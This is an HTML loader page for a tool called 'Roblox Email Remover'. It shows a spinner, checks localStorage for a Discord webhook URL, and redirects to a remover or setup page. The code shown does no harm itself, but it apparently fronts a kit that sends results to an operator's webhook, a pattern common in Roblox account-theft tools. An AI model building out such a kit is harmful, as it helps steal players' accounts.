<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox Email Remover</title>
    <link href="all.min.css" rel="stylesheet">
    <link href="css2.css" rel="stylesheet">
    <style>
        :root {
            --primary: #0066ff;
            --secondary: #00a2ff;
            --dark: #1a1a1a;
            --light: #f5f5f5;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Poppins', sans-serif;
        }

        body {
            background: linear-gradient(135deg, #0066ff, #00a2ff);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
        }

        .loader {
            text-align: center;
        }

        .loader i {
            font-size: 3rem;
            margin-bottom: 1rem;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .message {
            font-size: 1.2rem;
            margin-bottom: 1rem;
        }
    </style>
</head>
<body>
    <div class="loader">
        <i class="fas fa-spinner"></i>
        <div class="message">Checking configuration...</div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            // Check if Discord webhook is configured
            const webhookUrl = localStorage.getItem('discord_webhook_url');
            
            setTimeout(() => {
                if (webhookUrl) {
                    // If webhook is configured, redirect to the email remover tool
                    window.location.href = 'Remover.html';
                } else {
                    // If webhook is not configured, redirect to setup page
                    window.location.href = 'setup.html';
                }
            }, 1500); // Short delay for better UX
        });
    </script>
</body>
</html>
